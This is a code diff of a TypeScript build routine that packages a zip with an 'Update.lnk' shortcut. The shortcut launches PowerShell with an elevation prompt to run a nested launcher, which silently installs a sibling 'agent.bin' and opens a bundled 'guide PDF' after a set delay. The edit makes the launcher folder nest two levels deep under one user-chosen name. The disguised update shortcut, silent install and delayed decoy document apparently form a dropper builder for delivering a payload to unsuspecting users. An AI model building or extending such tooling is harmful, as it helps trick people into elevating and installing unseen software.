@@ -14,9 +14,11 @@
  * PORTABILITY (FIX 1, final): the user double-clicks **Update.lnk**, which is a
  * PowerShell-bridge shortcut that targets the OS PowerShell at a FIXED system
  * path (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` — NO baked
- * username/path) and runs `Start-Process -FilePath ".\launcher\Launcher.exe"
- * -Verb RunAs`. Explorer starts the target in the Update.lnk's OWN folder (cwd),
- * so the relative `.\(sub)\\Launcher.exe` always resolves from wherever the
+ * username/path) and runs `Start-Process -FilePath ".\launcher\launcher\Launcher.exe"
+ * -Verb RunAs` (TASK_176: the launcher lives NESTED one level deeper — ONE
+ * user-typed folder name drives BOTH levels).
+ * Explorer starts the target in the Update.lnk's OWN folder (cwd),
+ * so the relative `.\(sub)\(sub)\\Launcher.exe` always resolves from wherever the
  * user extracted — dynamic, no hardcoded path. UAC comes from `-Verb RunAs`
  * (and/or the launcher's requireAdministrator). The launcher reads its sibling
  * agent.bin from ITS folder and installs silently.
@@ -183,6 +185,11 @@ export async function runLauncherBuild(opts: {
     updateLinkName = withExt.length <= 64 ? withExt : "Update.lnk";
   }
   const innerFolder = clean(opts.names?.innerFolder, "launcher");
+  // TASK_176: the launcher lives NESTED one level deeper — both levels use
+  // the SAME user-typed folder name (single rename drives both levels).
+  // e.g. folder rename `acme` -> zip holds `acme/acme/Launcher.exe` and the
+  // bridge targets `.\acme\acme\Launcher.exe`. No new param, no UI change.
+  const nested = `${innerFolder}/${innerFolder}`;
   const launcherName = clean(opts.names?.launcherName, "Launcher.exe");
   const payloadName = clean(opts.names?.payloadName, "agent.bin");
   // FIX 3: custom served zip download name (optional; fallback "Agent.zip").
@@ -249,15 +256,17 @@ export async function runLauncherBuild(opts: {
   fs.writeFileSync(agentBinPath, agentBin);
 
   // 5. Portable PowerShell-bridge Update.lnk: fixed system powershell target,
-  //    runs Start-Process .\launcher\Launcher.exe -Verb RunAs from the .lnk's
+  //    runs Start-Process .\acme\acme\Launcher.exe -Verb RunAs from the .lnk's
   //    own folder (cwd) -> UAC -> launcher reads agent.bin -> silent install.
+  //    TASK_176: pass the JOINED `inner\inner` relative path as the existing
+  //    -LauncherSubFolder value (no .ps1 logic change, just a longer value).
   const bridgeResult = await runPwsh([
     path.join(__dirname, "New-AgentShortcut.ps1"),
     "-PowershellBridge",
     "-Output",
     lnkPath,
     "-LauncherSubFolder",
-    innerFolder,
+    `${innerFolder}\\${innerFolder}`,
     "-LauncherTarget",
     launcherName,
     "-LauncherTag",
@@ -271,20 +280,22 @@ export async function runLauncherBuild(opts: {
   }
   const lnk = fs.readFileSync(lnkPath);
 
-  // 6. zip { <updateLinkName>, <innerFolder>/Launcher.exe, <innerFolder>/agent.bin }
+  // 6. zip { <updateLinkName>, <inner>/<inner>/Launcher.exe,
+  //    <inner>/<inner>/agent.bin } (TASK_176 nested: ONE user-typed folder
+  //    name drives BOTH levels)
   //    (temp files stay until validation). The launcher/* subfolder = FIX 2
   //    structure; the names are FIX 3 (defaults preserved when unset). The
-  //    attached guide PDF rides in the SAME launcher subfolder so the launcher
-  //    resolves it next to itself (`pdf` config) — Update.lnk stays alone at
-  //    the zip root.
+  //    attached guide PDF rides in the SAME nested launcher subfolder so the
+  //    launcher resolves it next to itself (`pdf` config) — Update.lnk stays
+  //    alone at the zip root.
   const zipEntries: ZipEntryInput[] = [
     { name: updateLinkName, data: lnk },
-    { name: `${innerFolder}/${launcherName}`, data: stampedExe },
-    { name: `${innerFolder}/${payloadName}`, data: agentBin },
+    { name: `${nested}/${launcherName}`, data: stampedExe },
+    { name: `${nested}/${payloadName}`, data: agentBin },
   ];
   if (inputs.pdfName && inputs.pdfData && inputs.pdfData.length > 0) {
     zipEntries.push({
-      name: `${innerFolder}/${inputs.pdfName}`,
+      name: `${nested}/${inputs.pdfName}`,
       data: inputs.pdfData,
     });
   }
@@ -306,7 +317,7 @@ export async function runLauncherBuild(opts: {
     agentBin,
     prevLauncherHash: lastLauncherSha256,
     prevLnkHash: lastLnkSha256,
-    names: { updateLinkName, innerFolder, launcherName, payloadName },
+    names: { updateLinkName, innerFolder: nested, launcherName, payloadName },
     ...(inputs.pdfName
       ? { pdf: { name: inputs.pdfName, delaySec: inputs.pdfDelaySec ?? 0 } }
       : {}),
